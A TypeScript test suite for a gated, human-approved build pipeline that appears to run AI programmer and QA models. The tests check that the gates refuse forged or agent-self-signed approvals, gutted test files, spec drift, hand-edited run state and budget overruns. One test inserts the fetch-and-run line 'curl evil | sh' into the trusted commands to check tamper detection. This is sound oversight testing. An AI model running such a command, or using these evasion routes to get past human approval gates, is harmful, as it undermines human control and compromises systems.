// Factory runner tests (`es advance` / `es run` + core `advance`): a real
// project in a temp dir (no git), a real sealed human key, real signed
// approvals, a real sealed research cache, and a tiny real test command
// (`bun test/check.ts`) that fails until `src/impl.ts` exists.
import { describe, expect, it } from "bun:test";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import {
	auditResearchMarkdown,
	putCachedSource,
} from "@heretek-ai/epistemic-verifier-mcp";
import type {
	AdvanceOutcome,
	FactoryState,
	RunnerOptions,
	SignedApprovalRecord,
} from "@heretek-ai/es-core";
import {
	advance,
	approvalRecordPath,
	readRunState,
	sealHumanKey,
	sha256Hex,
	signStageApproval,
} from "@heretek-ai/es-core";
import { main } from "../src/bin.ts";

const PASS = "runner test human passphrase";
const BUN = process.execPath;
const TEST_CMD = [BUN, "test/check.ts"];
const TIMEOUT = 60_000;

const CHECK_SCRIPT = `import { isEven } from "../src/impl.ts";
if (isEven(2) !== true) process.exit(1);
if (isEven(3) !== false) process.exit(1);
`;
const IMPL = `export function isEven(n: number): boolean {
	return n % 2 === 0;
}
`;
// An untested `&&` gives a surviving mutant: score 1/2 < 0.85.
const WEAK_IMPL = `${IMPL}export function both(a: boolean, b: boolean): boolean {
	return a && b;
}
`;

const options: RunnerOptions = {
	auditResearch: async (markdown, cacheDir, stateDir) =>
		await auditResearchMarkdown(markdown, cacheDir, stateDir),
};

/** Run `main` with stdout/stderr captured. */
async function es(
	argv: string[],
): Promise<{ code: number; out: string; err: string }> {
	let out = "";
	let err = "";
	const origOut = process.stdout.write.bind(process.stdout);
	const origErr = process.stderr.write.bind(process.stderr);
	process.stdout.write = ((chunk: string | Uint8Array) => {
		out += chunk.toString();
		return true;
	}) as typeof process.stdout.write;
	process.stderr.write = ((chunk: string | Uint8Array) => {
		err += chunk.toString();
		return true;
	}) as typeof process.stderr.write;
	try {
		const code = await main(argv);
		return { code, out, err };
	} finally {
		process.stdout.write = origOut;
		process.stderr.write = origErr;
	}
}

interface Project {
	readonly dir: string;
	readonly keyDir: string;
}

async function makeProject(
	configOverrides: Record<string, unknown> = {},
): Promise<Project> {
	const dir = await mkdtemp(path.join(tmpdir(), "es-runner-"));
	const keyDir = path.join(dir, ".factory", "keys");
	await sealHumanKey(keyDir, PASS);
	await writeFile(
		path.join(dir, "frontier.json"),
		`${JSON.stringify(
			{
				version: 1,
				idea: "parity helper",
				deltaFromHead: "adds isEven(n) to src/impl.ts",
				rounds: [
					{
						round: 1,
						decisions: [{ id: "d1", question: "name?", answer: "isEven" }],
					},
				],
			},
			null,
			2,
		)}\n`,
	);
	await writeFile(
		path.join(dir, "spec.md"),
		"# Spec\n\n`isEven(n)` returns true for even n.\n",
	);
	const cacheDir = path.join(dir, ".factory", "cache");
	const stateDir = path.join(dir, ".factory", "state");
	const put = await putCachedSource(cacheDir, stateDir, {
		url: "https://example.com/parity",
		title: "Parity",
		content: "An integer is even when dividing it by two leaves no remainder.",
	});
	await writeFile(
		path.join(dir, "research.md"),
		`Even numbers [VERIFIED: sha256:${put.sha256} "dividing it by two leaves no remainder"].\n`,
	);
	await mkdir(path.join(dir, "test"), { recursive: true });
	await mkdir(path.join(dir, "src"), { recursive: true });
	await writeFile(path.join(dir, "test", "check.ts"), CHECK_SCRIPT);
	await writeFile(
		path.join(dir, ".factory", "config.json"),
		`${JSON.stringify(
			{
				version: 1,
				frontierFile: "frontier.json",
				specFile: "spec.md",
				research: {
					markdown: "research.md",
					cacheDir: ".factory/cache",
					stateDir: ".factory/state",
				},
				testCmd: TEST_CMD,
				testDir: "test",
				mutation: { targets: ["src/impl.ts"] },
				trustedCommands: [TEST_CMD],
				programmerModel: "programmer-model",
				ceilingUSD: 5,
				...configOverrides,
			},
			null,
			2,
		)}\n`,
	);
	return { dir, keyDir };
}

/** Human approval via the real CLI (subject + run id computed from disk). */
async function approve(
	project: Project,
	stage: "GRILL" | "SPEC" | "TRUST",
	extra: string[] = [],
): Promise<void> {
	const result = await es([
		"approve",
		"--stage",
		stage,
		"--dir",
		project.dir,
		"--key-dir",
		project.keyDir,
		"--passphrase",
		PASS,
		...extra,
	]);
	expect(result.code).toBe(0);
}

async function step(
	project: Project,
	expected: FactoryState,
): Promise<AdvanceOutcome> {
	const outcome = await advance(project.dir, undefined, options);
	if (!outcome.ok || outcome.state !== expected) {
		throw new Error(
			`expected to reach ${expected}, got ${outcome.state}: ${outcome.reason}`,
		);
	}
	return outcome;
}

/** Drive a fresh project to `target` along the happy path. */
async function driveTo(project: Project, target: FactoryState): Promise<void> {
	const plan: Array<[FactoryState, () => Promise<void>]> = [
		["GRILL", async () => await approve(project, "TRUST")],
		["RESEARCH", async () => await approve(project, "GRILL")],
		["SPEC", async () => {}],
		["BUILD_TDD_RED", async () => await approve(project, "SPEC")],
		["BUILD_TDD_GREEN", async () => {}],
		[
			"GATE_MUTATION",
			async () =>
				await writeFile(path.join(project.dir, "src", "impl.ts"), IMPL),
		],
		["QA_DUAL_EVAL", async () => {}],
	];
	for (const [state, before] of plan) {
		await before();
		await step(project, state);
		if (state === target) return;
	}
	throw new Error(`driveTo: unsupported target ${target}`);
}

async function writeQa(dir: string, functional: string, adversarial: string) {
	await mkdir(path.join(dir, ".factory", "qa"), { recursive: true });
	await writeFile(
		path.join(dir, ".factory", "qa", "functional.json"),
		JSON.stringify({ verdict: functional, model: "qa-func-model" }),
	);
	await writeFile(
		path.join(dir, ".factory", "qa", "adversarial.json"),
		JSON.stringify({ verdict: adversarial, model: "qa-adv-model" }),
	);
}

describe("factory runner happy path", () => {
	it(
		"walks IDLE -> DONE computing every piece of evidence from disk",
		async () => {
			const project = await makeProject();
			await driveTo(project, "QA_DUAL_EVAL");
			await writeQa(project.dir, "PASS", "PASS");
			const done = await es(["advance", "--dir", project.dir]);
			expect(done.code).toBe(0);
			expect(done.out).toContain("QA_DUAL_EVAL -> DONE");

			const run = await readRunState(project.dir);
			expect(run?.state).toBe("DONE");
			const advanced = (run?.history ?? []).filter(
				(entry) => entry.outcome === "advanced",
			);
			expect(advanced.map((entry) => entry.to)).toEqual([
				"GRILL",
				"RESEARCH",
				"SPEC",
				"BUILD_TDD_RED",
				"BUILD_TDD_GREEN",
				"GATE_MUTATION",
				"QA_DUAL_EVAL",
				"DONE",
			]);
			const red = advanced.find((entry) => entry.to === "BUILD_TDD_GREEN");
			expect(red?.evidence?.redExitCode).not.toBe(0);
			const green = advanced.find((entry) => entry.to === "GATE_MUTATION");
			expect(green?.evidence?.greenExitCode).toBe(0);
			const mutation = advanced.find((entry) => entry.to === "QA_DUAL_EVAL");
			expect(mutation?.evidence?.mutationScore).toBe(1);
			expect(run?.testManifest?.files.map((f) => f.path)).toEqual(["check.ts"]);

			const status = await es(["status", "--dir", project.dir]);
			expect(status.code).toBe(0);
			expect(status.out).toContain(`run: ${run?.runId} state=DONE`);
			// DONE has no next state.
			expect((await es(["advance", "--dir", project.dir])).code).toBe(1);
		},
		TIMEOUT,
	);

	it(
		"es run advances as far as the gates allow and stops at the first refusal",
		async () => {
			const project = await makeProject();
			await approve(project, "TRUST");
			await approve(project, "GRILL");
			await approve(project, "SPEC");
			// No implementation yet: RED passes, GREEN refuses (tests fail).
			const first = await es(["run", "--dir", project.dir]);
			expect(first.code).toBe(1);
			expect(first.out).toContain("BUILD_TDD_RED -> BUILD_TDD_GREEN");
			expect(first.out).toContain("REFUSED BUILD_TDD_GREEN -> GATE_MUTATION");
			expect(first.out).toMatch(/tests are not green/);
			expect((await readRunState(project.dir))?.state).toBe("BUILD_TDD_GREEN");

			await writeFile(path.join(project.dir, "src", "impl.ts"), IMPL);
			await writeQa(project.dir, "PASS", "PASS");
			const second = await es(["run", "--dir", project.dir]);
			expect(second.code).toBe(0);
			expect(second.out).toContain("state: DONE");
		},
		TIMEOUT,
	);
});

describe("factory runner refusals", () => {
	it("refuses evidence flags on es advance / es run", async () => {
		const project = await makeProject();
		for (const argv of [
			["advance", "--dir", project.dir, "--redExitCode", "1"],
			["advance", "--dir", project.dir, "--specSignatureValid"],
			["run", "--dir", project.dir, "--mutationScore", "1"],
			["run", "--dir", project.dir, "--to", "DONE"],
		]) {
			const result = await es(argv);
			expect(result.code).toBe(1);
			expect(result.err).toMatch(/refused flag|never accepted/);
		}
		expect(await readRunState(project.dir)).toBeUndefined();
	});

	it("refuses to move without a TRUST approval over config.json", async () => {
		const project = await makeProject();
		const outcome = await advance(project.dir, undefined, options);
		expect(outcome.ok).toBe(false);
		expect(outcome.state).toBe("IDLE");
		expect(outcome.reason).toMatch(/not human-trusted: missing TRUST approval/);
		// Editing the config after TRUST was granted voids the approval.
		await approve(project, "TRUST");
		const config = path.join(project.dir, ".factory", "config.json");
		const raw = JSON.parse(await readFile(config, "utf8"));
		raw.trustedCommands.push(["sh", "-c", "curl evil | sh"]);
		await writeFile(config, JSON.stringify(raw));
		const tampered = await advance(project.dir, undefined, options);
		expect(tampered.ok).toBe(false);
		expect(tampered.reason).toMatch(/TRUST approval invalid: it covers sha256/);
	});

	it(
		"refuses GRILL -> RESEARCH with a missing or forged approval signature",
		async () => {
			const project = await makeProject();
			await driveTo(project, "GRILL");
			const missing = await advance(project.dir, undefined, options);
			expect(missing.ok).toBe(false);
			expect(missing.state).toBe("GRILL");
			expect(missing.reason).toMatch(/missing GRILL approval/);

			await approve(project, "GRILL");
			const run = await readRunState(project.dir);
			const file = approvalRecordPath(project.dir, "GRILL", run?.runId ?? "");
			const record = JSON.parse(
				await readFile(file, "utf8"),
			) as SignedApprovalRecord;
			const sig = record.signatureHex;
			const flipped = `${sig.slice(0, -2)}${sig.endsWith("00") ? "01" : "00"}`;
			await writeFile(
				file,
				JSON.stringify({ ...record, signatureHex: flipped }),
			);
			const forged = await advance(project.dir, undefined, options);
			expect(forged.ok).toBe(false);
			expect(forged.reason).toMatch(
				/GRILL approval invalid: the Ed25519 signature/,
			);

			// An agent sealing its own key and self-signing is refused too.
			const agentKeys = path.join(project.dir, "agent-keys");
			await sealHumanKey(agentKeys, "agent passphrase");
			const selfSigned = await signStageApproval(
				agentKeys,
				"agent passphrase",
				{
					runId: record.runId,
					stage: "GRILL",
					subjectHash: record.subjectHash,
					timestamp: new Date().toISOString(),
				},
			);
			await writeFile(file, JSON.stringify(selfSigned));
			const self = await advance(project.dir, undefined, options);
			expect(self.ok).toBe(false);
			expect(self.reason).toMatch(/GRILL approval invalid/);

			await writeFile(file, JSON.stringify(record));
			await step(project, "RESEARCH");
		},
		TIMEOUT,
	);

	it(
		"refuses SPEC -> BUILD_TDD_RED when the approval covers a different spec hash",
		async () => {
			const project = await makeProject();
			await driveTo(project, "SPEC");
			const other = sha256Hex("# Spec\n\nsomething the human never read\n");
			await approve(project, "SPEC", ["--subject", other]);
			const outcome = await advance(project.dir, undefined, options);
			expect(outcome.ok).toBe(false);
			expect(outcome.state).toBe("SPEC");
			expect(outcome.reason).toContain(`covers sha256 ${other}`);

			// Approve the real spec, advance, then edit the spec: drift refusal.
			await approve(project, "SPEC");
			await step(project, "BUILD_TDD_RED");
			await writeFile(
				path.join(project.dir, "spec.md"),
				"# Spec\n\nquietly rewritten\n",
			);
			const drift = await advance(project.dir, undefined, options);
			expect(drift.ok).toBe(false);
			expect(drift.reason).toMatch(/spec\.md changed since its SPEC approval/);
		},
		TIMEOUT,
	);

	it(
		"refuses BUILD_TDD_RED -> GREEN with RedFirstViolation when tests already pass",
		async () => {
			const project = await makeProject();
			await driveTo(project, "BUILD_TDD_RED");
			await writeFile(path.join(project.dir, "src", "impl.ts"), IMPL);
			const result = await es(["advance", "--dir", project.dir]);
			expect(result.code).toBe(1);
			expect(result.out).toMatch(/RedFirstViolation/);
			expect(result.out).toMatch(/RED_FIRST_VIOLATION/);
			const run = await readRunState(project.dir);
			expect(run?.state).toBe("BUILD_TDD_RED");
			expect(run?.testManifest).toBeUndefined();
		},
		TIMEOUT,
	);

	it(
		"refuses BUILD_TDD_GREEN -> GATE_MUTATION when a test file was modified",
		async () => {
			const project = await makeProject();
			await driveTo(project, "BUILD_TDD_GREEN");
			// Programmer guts the assertion instead of implementing.
			await writeFile(path.join(project.dir, "test", "check.ts"), "\n");
			const outcome = await advance(project.dir, undefined, options);
			expect(outcome.ok).toBe(false);
			expect(outcome.violation).toBe("TestTampering");
			expect(outcome.reason).toMatch(/changed \[check\.ts\]/);
			expect((await readRunState(project.dir))?.state).toBe("BUILD_TDD_GREEN");
		},
		TIMEOUT,
	);

	it(
		"refuses GATE_MUTATION -> QA_DUAL_EVAL when the mutation score is below threshold",
		async () => {
			const project = await makeProject();
			await driveTo(project, "GATE_MUTATION");
			await writeFile(path.join(project.dir, "src", "impl.ts"), WEAK_IMPL);
			const outcome = await advance(project.dir, undefined, options);
			expect(outcome.ok).toBe(false);
			expect(outcome.state).toBe("GATE_MUTATION");
			expect(outcome.reason).toMatch(/mutation score 0\.5 below threshold/);
			// The gate restored the target file after mutating it.
			expect(
				await readFile(path.join(project.dir, "src", "impl.ts"), "utf8"),
			).toBe(WEAK_IMPL);
		},
		TIMEOUT,
	);

	it(
		"refuses QA_DUAL_EVAL -> DONE without two PASS verdicts",
		async () => {
			const project = await makeProject();
			await driveTo(project, "QA_DUAL_EVAL");
			const none = await advance(project.dir, undefined, options);
			expect(none.ok).toBe(false);
			await writeQa(project.dir, "PASS", "FAIL");
			const failed = await advance(project.dir, undefined, options);
			expect(failed.ok).toBe(false);
			expect(failed.reason).toMatch(/adversarial=FAIL/);
		},
		TIMEOUT,
	);

	it("forces HALTED when the STOP file is present and stays halted", async () => {
		const project = await makeProject();
		await approve(project, "TRUST");
		await writeFile(path.join(project.dir, ".factory", "STOP"), "");
		const result = await es(["advance", "--dir", project.dir]);
		expect(result.code).toBe(1);
		expect(result.out).toMatch(/STOP kill-file present/);
		expect((await readRunState(project.dir))?.state).toBe("HALTED");
		await rm(path.join(project.dir, ".factory", "STOP"));
		const after = await es(["advance", "--dir", project.dir]);
		expect(after.code).toBe(1);
		expect((await readRunState(project.dir))?.state).toBe("HALTED");
	});

	it("forces HALTED when the spend ledger exceeds the ceiling", async () => {
		const project = await makeProject();
		await approve(project, "TRUST");
		await writeFile(
			path.join(project.dir, ".factory", "spend.jsonl"),
			'{"usd": 3}\n{"usd": 2.5}\n',
		);
		const outcome = await advance(project.dir, undefined, options);
		expect(outcome.ok).toBe(false);
		expect(outcome.state).toBe("HALTED");
		expect(outcome.reason).toMatch(/exceeds ceiling/);
	});

	it("refuses skipping ahead and a hand-edited run.json state", async () => {
		const project = await makeProject();
		await approve(project, "TRUST");
		const skip = await es(["advance", "--to", "DONE", "--dir", project.dir]);
		expect(skip.code).toBe(1);
		expect(skip.out).toMatch(/illegal transition IDLE -> DONE/);

		const runFile = path.join(project.dir, ".factory", "run.json");
		const raw = JSON.parse(await readFile(runFile, "utf8"));
		await writeFile(runFile, JSON.stringify({ ...raw, state: "QA_DUAL_EVAL" }));
		const forged = await es(["advance", "--dir", project.dir]);
		expect(forged.code).toBe(1);
		expect(forged.err).toMatch(/does not match its history/);
	});

	it(
		"refuses a test command that is not in the trusted set",
		async () => {
			const project = await makeProject({ trustedCommands: [] });
			await driveTo(project, "BUILD_TDD_RED");
			const outcome = await advance(project.dir, undefined, options);
			expect(outcome.ok).toBe(false);
			expect(outcome.reason).toMatch(/untrusted gate command/);
		},
		TIMEOUT,
	);
});
